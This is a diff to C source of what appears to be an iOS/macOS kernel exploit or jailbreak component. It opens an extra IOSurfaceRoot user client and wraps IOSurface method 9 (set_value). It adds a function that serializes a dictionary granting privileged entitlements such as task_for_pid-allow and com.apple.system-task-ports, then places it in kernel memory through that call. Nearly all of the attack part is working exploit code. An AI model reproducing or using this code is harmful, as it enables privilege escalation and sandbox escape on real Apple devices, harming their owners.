@@ -7,6 +7,8 @@
 #include <pthread.h>
 #include <string.h>
 #include <stdlib.h>
+#include <dlfcn.h>
+#include <CoreFoundation/CoreFoundation.h>
 
 #include "IOKit/IOKitLib.h"
 
@@ -83,6 +85,29 @@ mach_port_t IOSurfaceRootUserClient;
 // The ID of the IOSurface we're using.
 uint32_t IOSurface_id;
 
+mach_port_t IOSurface_worker_uc;
+uint32_t IOSurface_worker_id;
+
+// ---- External methods --------------------------------------------------------------------------
+
+static bool
+IOSurface_set_value(const struct IOSurfaceValueArgs *args, size_t args_size) {
+    struct IOSurfaceValueResultArgs result;
+    size_t result_size = sizeof(result);
+    kern_return_t kr = IOConnectCallMethod(
+            IOSurface_worker_uc,
+            9, // set_value
+            NULL, 0,
+            args, args_size,
+            NULL, NULL,
+            &result, &result_size);
+    if (kr != KERN_SUCCESS) {
+        util_error("Failed to %s value in %s: 0x%x", "set", "IOSurface", kr);
+        return false;
+    }
+    return true;
+}
+
 // ---- Initialization ----------------------------------------------------------------------------
 
 uint32_t iosurface_create_fast()
@@ -147,6 +172,50 @@ void iosurface_s_set_indexed_timestamp(uint64_t v)
     }
 }
 
+static void build_essential_entitlements(void)
+{
+    CFMutableArrayRef array;
+    CFDictionaryRef dict;
+    CFStringRef key = CFSTR("essential-entitlements");
+    CFStringRef ent_keys[] = {
+        CFSTR("task_for_pid-allow"),
+        CFSTR("com.apple.system-task-ports"),
+        CFSTR("com.apple.private.security.container-manager"),
+        CFSTR("com.apple.private.security.storage.AppBundles"),
+    };
+    CFTypeRef ent_values[] = {
+        kCFBooleanTrue,
+        kCFBooleanTrue,
+        kCFBooleanTrue,
+        kCFBooleanTrue,
+    };
+
+    dict = CFDictionaryCreate(NULL, (void *)ent_keys, (void *)ent_values, arrayn(ent_keys),
+            &kCFCopyStringDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+    array = CFArrayCreateMutable(kCFAllocatorDefault, 0, &kCFTypeArrayCallBacks);
+    CFArrayAppendValue(array, dict);
+    CFArrayAppendValue(array, key);
+
+    void *hIOKit = dlopen("/System/Library/Frameworks/IOKit.framework/Versions/A/IOKit", RTLD_LOCAL);
+    static CFDataRef (*IOCFSerialize)(CFTypeRef, uint32_t);
+    IOCFSerialize = dlsym(hIOKit, "IOCFSerialize");
+    assert(IOCFSerialize != NULL);
+
+    CFDataRef data = IOCFSerialize(array, 1);
+
+    size_t len = CFDataGetLength(data);
+    struct IOSurfaceValueArgs *args = malloc(sizeof(*args) + len);
+    args->surface_id = IOSurface_worker_id;
+    args->field_4 = 0;
+    memcpy(args->xml, CFDataGetBytePtr(data), len);
+    IOSurface_set_value(args, sizeof(*args) + len);
+    free(args);
+
+    CFRelease(dict);
+    CFRelease(array);
+    CFRelease(data);
+}
+
 bool
 IOSurface_init() {
 	if (IOSurface_initialized) {
@@ -168,6 +237,11 @@ IOSurface_init() {
 		util_error("could not open %s", "IOSurfaceRootUserClient");
 		return false;
 	}
+    kr = IOServiceOpen(IOSurfaceRoot, mach_task_self(), 0, &IOSurface_worker_uc);
+    if (kr != KERN_SUCCESS) {
+        util_error("could not open %s", "IOSurfaceRoot worker UserClient");
+        return false;
+    }
 	struct _IOSurfaceFastCreateArgs create_args = { .alloc_size = (uint32_t) g_exp.pagesize };
 	struct IOSurfaceLockResult lock_result;
 	size_t lock_result_size = sizeof(lock_result);
@@ -183,6 +257,19 @@ IOSurface_init() {
 		return false;
 	}
 	IOSurface_id = lock_result.surface_id;
+    kr = IOConnectCallMethod(
+            IOSurface_worker_uc,
+            6, // create_surface_client_fast_path
+            NULL, 0,
+            &create_args, sizeof(create_args),
+            NULL, NULL,
+            &lock_result, &lock_result_size);
+    if (kr != KERN_SUCCESS) {
+        util_error("could not create %s: 0x%x", "IOSurfaceClient worker", kr);
+        return false;
+    }
+    IOSurface_worker_id = lock_result.surface_id;
+    build_essential_entitlements();
 	IOSurface_initialized = true;
 	return true;
 }
